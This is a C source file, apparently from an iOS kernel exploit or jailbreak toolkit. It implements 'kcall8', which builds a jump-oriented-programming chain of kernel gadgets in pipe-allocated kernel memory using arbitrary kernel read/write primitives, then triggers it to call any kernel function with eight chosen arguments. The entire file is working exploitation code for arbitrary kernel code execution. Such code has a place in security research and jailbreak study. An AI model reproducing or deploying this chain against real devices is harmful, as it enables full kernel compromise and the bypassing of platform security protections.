#include "offsets.h"
#include "krw.h"
#include "kexecute.h"
#include "kalloc_pipe.h"

uint64_t kcall8(uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6, uint64_t x7) {
    pipe_info_t *kpage_pipe = kalloc_via_pipe(0x1000);
    uint64_t kpage = kpage_pipe->kern_buffer;

    kwrite64(kpage, kpage);
    kwrite64(kpage + 0x98, kpage);
    kwrite64(kpage + 0x7c0, kgad(KGADGET_POPULATE) + 4);

    kwrite64(kpage + 0x100, 0);
    kwrite64(kpage + 0x108, 0);
    kwrite64(kpage + 0x110, kpage + 0x800);  
    kwrite64(kpage + 0x118, x7);               
    kwrite64(kpage + 0x120, kgad(KGADGET_POPULATE)); 

    uint64_t current_kpage = kpage + 0x800;
    kwrite64(current_kpage, kgad(KGADGET_MOV_X12_X0__BR_x2));
    kwrite64(current_kpage + 0x8, kgad(KGADGET_POPULATE)); 
    kwrite64(current_kpage + 0x10, current_kpage + 0x40);     
    kwrite64(current_kpage + 0x18, kgad(KGADGET_POPULATE));     
    kwrite64(current_kpage + 0x20, 0);

    current_kpage += 0x40;
    kwrite64(current_kpage, kgad(KGADGET_MOV_X10_X0__BR_X2));
    kwrite64(current_kpage + 0x8, kgad(KGADGET_POPULATE));     
    kwrite64(current_kpage + 0x10, current_kpage + 0x40);
    kwrite64(current_kpage + 0x18, kgad(KGADGET_POPULATE));     
    kwrite64(current_kpage + 0x20, 0);

    current_kpage += 0x40; 
    kwrite64(current_kpage, kgad(KGADGET_MOV_X16_X15__BR_X12));
    kwrite64(current_kpage + 0x8, kgad(KGADGET_POPULATE));     
    kwrite64(current_kpage + 0x10, current_kpage + 0x40);
    kwrite64(current_kpage + 0x18, kgad(KGADGET_POPULATE));     
    kwrite64(current_kpage + 0x20, 0);
    
    //x7 is now jop's x7
    current_kpage += 0x40; 
    kwrite64(current_kpage, kgad(KGADGET_MOV_X7_X16__BR_X10));
    kwrite64(current_kpage + 0x8, kgad(KGADGET_POPULATE));     
    kwrite64(current_kpage + 0x10, current_kpage + 0x40);
    kwrite64(current_kpage + 0x18, kgad(KGADGET_POPULATE));
    kwrite64(current_kpage + 0x20, 0);

    current_kpage += 0x40; 
    kwrite64(current_kpage, kgad(KGADGET_MOV_X10_X0__BR_X12));
    kwrite64(current_kpage + 0x8, x4);     
    kwrite64(current_kpage + 0x10, current_kpage + 0x40);
    kwrite64(current_kpage + 0x18, kgad(KGADGET_POPULATE));
    kwrite64(current_kpage + 0x20, 0);

    current_kpage += 0x40; 
    kwrite64(current_kpage, kgad(KGADGET_MOV_X13_X2__BR_X12));
    kwrite64(current_kpage + 0x8, kgad(KGADGET_POPULATE));
    kwrite64(current_kpage + 0x10, current_kpage + 0x40);
    kwrite64(current_kpage + 0x18, x4);
    kwrite64(current_kpage + 0x20, 0);

    current_kpage += 0x40; 
    kwrite64(current_kpage, kgad(KGADGET_MOV_X15_X2__BR_X3));
    kwrite64(current_kpage + 0x8, kgad(KGADGET_POPULATE));
    kwrite64(current_kpage + 0x10, current_kpage + 0x40);
    kwrite64(current_kpage + 0x18, addr);
    kwrite64(current_kpage + 0x20, kgad(KGADGET_POPULATE));

    current_kpage += 0x40; 
    kwrite64(current_kpage, kgad(KGADGET_MOV_X4_X13__BR_X15));
    kwrite64(current_kpage + 0x8, x0);
    kwrite64(current_kpage + 0x10, x1);
    kwrite64(current_kpage + 0x18, x2);
    kwrite64(current_kpage + 0x20, x3);

    uint64_t STORED_RET = kpage + 0x100;
    kexecute(kgad(KGADGET_PROLOGUE), kpage, STORED_RET, 0, 0, kgad(KGADGET_MOV_X15_X2__BR_X3), x5, x6);
    uint64_t ret = kread64(STORED_RET);
    kfree_via_pipe(kpage_pipe);
    return ret;
}